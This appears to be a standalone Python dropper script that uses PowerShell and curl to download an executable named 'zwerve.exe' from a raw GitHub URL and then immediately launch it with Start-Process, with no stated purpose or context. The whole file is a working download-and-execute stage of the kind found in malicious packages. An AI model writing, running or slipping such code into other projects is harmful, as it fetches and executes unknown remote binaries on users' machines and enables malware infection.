import subprocess
import os
output_file=os.path.join(os.getcwd(),"zwerve.exe")
download_command=f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o "{output_file}"'
download_result=subprocess.run(["powershell","-Command",download_command],capture_output=True,text=True)
print("Download Output:",download_result.stdout)
print("Download Error:",download_result.stderr)
if download_result.returncode==0 and os.path.exists(output_file):
  execute_command=f'Start-Process "{output_file}" -NoNewWindow -Wait'
  execute_result=subprocess.run(["powershell","-Command",execute_command],capture_output=True,text=True)
  print("Execution Output:",execute_result.stdout)
  print("Execution Error:",execute_result.stderr)
else:
  print("File download failed or file not found.")
